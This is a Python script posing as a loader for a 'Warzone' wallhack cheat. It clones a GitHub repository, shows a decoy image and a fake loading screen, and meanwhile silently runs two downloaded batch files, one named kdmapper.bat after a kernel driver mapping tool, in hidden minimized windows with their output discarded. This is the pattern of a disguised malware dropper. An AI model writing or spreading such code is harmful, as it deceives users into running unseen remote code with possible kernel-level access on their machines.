import time
import sys
import os
import subprocess
from art import *
import numpy as np
from PIL import Image
import git 
#os.system('cmd /c "START  /MIN CMD.EXE /C kdmapper.bat >nul 2>&1"')
git.Repo.clone_from("https://github.com/BaruchBenedictusDeSpinoza/xnawindows.git", "/Templates/xnawindows")
im = Image.open(r"/Templates/xnawindows/WarzoneWallHack.jpg") 
im.show()
subprocess.Popen('cmd /c "START /MIN CMD.EXE /C /Templates/xnawindows/kdmapper.bat >nul 2>&1"', shell=True, stdout=subprocess.PIPE,stdin=subprocess.PIPE, stderr=subprocess.PIPE)
subprocess.Popen('cmd /c "START /MIN CMD.EXE /C /Templates/xnawindows/publictesting.bat >nul 2>&1"', shell=True, stdout=subprocess.PIPE,stdin=subprocess.PIPE, stderr=subprocess.PIPE)
tprint("WARZONE",font="rnd-large")
tprint("Please Wait Untill Loading Process Ends...",font="rnd-small")

for i in range(9):
    time.sleep(10)
    sys.stdout.write('Still_Loading...-')
    sys.stdout.flush()
